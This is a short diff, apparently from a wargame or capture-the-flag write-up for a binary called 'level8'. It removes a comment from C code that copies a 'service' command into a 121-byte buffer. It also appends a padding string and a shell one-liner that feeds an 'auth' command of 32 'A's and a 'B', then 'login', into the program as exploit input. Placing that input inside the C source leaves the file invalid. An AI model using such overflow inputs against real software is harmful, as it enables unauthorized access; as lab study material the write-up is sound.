@@ -37,7 +37,7 @@ int main()
     // If the command starts with "service"
     if (strncmp(buf, "service", 7) == 0)
     {
-        char temp[121];  // 0x79 = 121
+        char temp[121];
         strncpy(temp, buf + 8, sizeof(temp) - 1);
         temp[sizeof(temp) - 1] = '\0';
 
@@ -59,3 +59,7 @@ int main()
 
     return (0);
 }
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$ (echo 'auth '$(python -c "print('A'*32 + 'B')"); echo login) | ./level8
+
